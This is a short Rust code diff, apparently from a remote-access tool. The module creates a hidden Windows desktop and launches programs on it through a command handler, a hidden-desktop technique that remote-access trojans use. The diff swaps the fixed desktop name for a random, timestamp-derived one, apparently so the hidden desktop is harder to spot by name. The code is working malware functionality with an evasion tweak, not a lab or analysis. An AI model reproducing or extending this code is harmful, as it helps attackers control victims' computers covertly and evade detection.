@@ -54,13 +54,16 @@ struct BitmapInfo {
 }
 
 static mut DESK: Hdesk = ptr::null_mut();
+static mut DESK_NAME: String = String::new();
 
 fn wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }
 
 fn ensure() -> bool {
     unsafe {
         if !DESK.is_null() { return true; }
-        let name = wide("SockPuppetsHD");
+        let ticks = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_nanos()).unwrap_or(1);
+        DESK_NAME = format!("d{ticks:x}");
+        let name = wide(&DESK_NAME);
         DESK = CreateDesktopW(name.as_ptr(), ptr::null(), ptr::null_mut(), 0, 0x10000000, ptr::null_mut());
         if DESK.is_null() { DESK = OpenDesktopW(name.as_ptr(), 0, 0, 0x02000000); }
         !DESK.is_null()
@@ -94,7 +97,7 @@ pub fn handle(rest: &str) -> String {
 }
 
 fn start(exe: &str) -> String {
-    let mut desktop = wide(r"WinSta0\SockPuppetsHD");
+    let mut desktop = wide(&format!("WinSta0\\{}", unsafe { &DESK_NAME }));
     let mut cmd = wide(exe);
     let mut si = StartupInfo { cb: std::mem::size_of::<StartupInfo>() as u32, reserved: ptr::null_mut(), desktop: desktop.as_mut_ptr(), title: ptr::null_mut(), x: 0, y: 0, x_size: 0, y_size: 0, x_chars: 0, y_chars: 0, fill: 0, flags: 1, show: 5, reserved2: 0, reserved3: ptr::null_mut(), stdin: ptr::null_mut(), stdout: ptr::null_mut(), stderr: ptr::null_mut() };
     let mut pi = ProcessInfo { process: ptr::null_mut(), thread: ptr::null_mut(), pid: 0, tid: 0 };
